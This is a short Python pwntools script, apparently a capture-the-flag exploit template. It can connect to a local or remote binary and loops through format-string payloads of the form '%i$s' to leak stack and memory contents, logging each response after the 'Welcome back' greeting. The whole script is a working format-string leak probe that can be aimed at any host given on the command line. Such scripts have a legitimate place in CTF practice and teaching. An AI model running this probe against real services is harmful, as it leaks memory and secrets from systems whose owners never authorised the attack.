from pwn import args, gdb, remote, process, p64, flat, ROP, ELF, context, log, sys


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

# exe = "./binary"
# elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
# context.terminal = "kitty"

for i in range(1, 100):
    try:
        io = start()
        format = f"%{i}$s".encode()
        io.sendlineafter(b"again?\n", format)
        io.recvuntil(b"Welcome back ")
        out = io.recvline()
        log.info(out)
    except:
        continue
